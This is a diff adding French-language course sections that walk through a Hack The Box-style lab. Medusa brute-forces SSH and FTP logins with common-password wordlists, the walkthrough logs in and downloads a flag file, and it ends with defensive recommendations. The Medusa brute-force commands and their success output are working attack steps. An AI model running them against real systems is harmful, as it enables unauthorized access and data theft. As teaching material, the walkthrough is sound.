@@ -219,7 +219,142 @@ sudo apt install medusa</code></pre>
     <li>Surveiller activement les logs d’accès</li>
   </ul>
 </section>
+<section class="course-section">
+  <h2>🔎 Exploitation pratique avec Medusa (SSH & FTP)</h2>
 
+  <p>
+    Dans un paysage cybersécuritaire en constante évolution, la robustesse des
+    mécanismes d’authentification est cruciale. Malgré l’utilisation de protocoles
+    réputés comme <strong>SSH</strong> et <strong>FTP</strong>, beaucoup de services
+    reposent encore sur des couples <em>nom d’utilisateur / mot de passe</em>,
+    ce qui les rend vulnérables aux attaques par brute‑force.
+  </p>
+
+  <p>
+    Cette démonstration illustre comment <strong>Medusa</strong> peut être utilisé
+    pour compromettre successivement un service SSH puis un service FTP,
+    mettant en évidence les failles liées aux mots de passe faibles
+    et l’importance d’une authentification renforcée.
+  </p>
+</section>
+
+<section class="course-section">
+  <h3>🔐 Rappel : SSH et FTP</h3>
+
+  <p>
+    <strong>SSH (Secure Shell)</strong> est un protocole cryptographique permettant
+    l’accès distant sécurisé, l’exécution de commandes et le transfert de fichiers.
+    Bien que chiffré, sa sécurité peut être compromise par des mots de passe
+    faibles ou réutilisés.
+  </p>
+
+  <p>
+    <strong>FTP (File Transfer Protocol)</strong> est utilisé pour le transfert de fichiers
+    sur un réseau. Dans sa version classique, les identifiants sont transmis
+    <strong>en clair</strong>, ce qui en fait une cible privilégiée pour l’interception
+    et le brute‑force.
+  </p>
+</section>
+
+<section class="course-section">
+  <h3>🚀 Attaque du service SSH</h3>
+
+  <p>
+    En supposant que le nom d’utilisateur <code>sshuser</code> est connu,
+    Medusa peut tester une liste de mots de passe courants afin
+    d’identifier le bon identifiant.
+  </p>
+
+  <pre><code>medusa -h &lt;IP&gt; -n &lt;PORT&gt; -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3</code></pre>
+
+  <ul>
+    <li><code>-h</code> : adresse IP de la cible</li>
+    <li><code>-n</code> : port SSH (par défaut 22)</li>
+    <li><code>-u</code> : utilisateur connu</li>
+    <li><code>-P</code> : wordlist de mots de passe</li>
+    <li><code>-M ssh</code> : module SSH</li>
+    <li><code>-t 3</code> : tentatives parallèles</li>
+  </ul>
+
+  <pre><code>ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]</code></pre>
+</section>
+
+<section class="course-section">
+  <h3>🔓 Accès au système</h3>
+
+  <p>
+    Une fois le mot de passe identifié, l’accès SSH est immédiat :
+  </p>
+
+  <pre><code>ssh sshuser@&lt;IP&gt; -p &lt;PORT&gt;</code></pre>
+
+  <p>
+    L’attaquant dispose alors d’un accès interactif à la machine cible.
+  </p>
+</section>
+
+<section class="course-section">
+  <h3>🔍 Extension de la surface d’attaque</h3>
+
+  <p>
+    Une analyse des ports ouverts permet d’identifier d’autres services exposés :
+  </p>
+
+  <pre><code>netstat -tulpn | grep LISTEN</code></pre>
+
+  <pre><code>21/tcp open  ftp
+22/tcp open  ssh</code></pre>
+
+  <p>
+    Le scan avec <strong>nmap</strong> confirme la présence d’un serveur FTP actif.
+  </p>
+</section>
+
+<section class="course-section">
+  <h3>📂 Attaque du service FTP</h3>
+
+  <p>
+    La présence d’un compte <code>ftpuser</code> suggère un utilisateur FTP.
+    Medusa peut alors être utilisé pour brute‑forcer l’accès :
+  </p>
+
+  <pre><code>medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5</code></pre>
+
+  <pre><code>ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: ****** [SUCCESS]</code></pre>
+</section>
+
+<section class="course-section">
+  <h3>📥 Récupération de données</h3>
+
+  <p>
+    Après authentification, l’accès FTP permet de récupérer des fichiers sensibles :
+  </p>
+
+  <pre><code>ftp ftp://ftpuser:&lt;FTP_PASSWORD&gt;@localhost</code></pre>
+
+  <pre><code>ftp&gt; ls
+ftp&gt; get flag.txt</code></pre>
+
+  <pre><code>cat flag.txt
+HTB{...}</code></pre>
+
+  <p>
+    Cet exemple illustre la facilité avec laquelle des informations critiques
+    peuvent être compromises en cas de mauvaise hygiène de sécurité.
+  </p>
+</section>
+
+<section class="course-section">
+  <h3>🛡️ Leçon de sécurité</h3>
+
+  <ul>
+    <li>Mots de passe longs, uniques et complexes</li>
+    <li>Désactivation de l’authentification par mot de passe (clé SSH)</li>
+    <li>Utilisation de SFTP au lieu de FTP</li>
+    <li>Rate limiting et bannissement IP</li>
+    <li>Surveillance active des logs</li>
+  </ul>
+</section>
 </main>
 </body>
 </html>
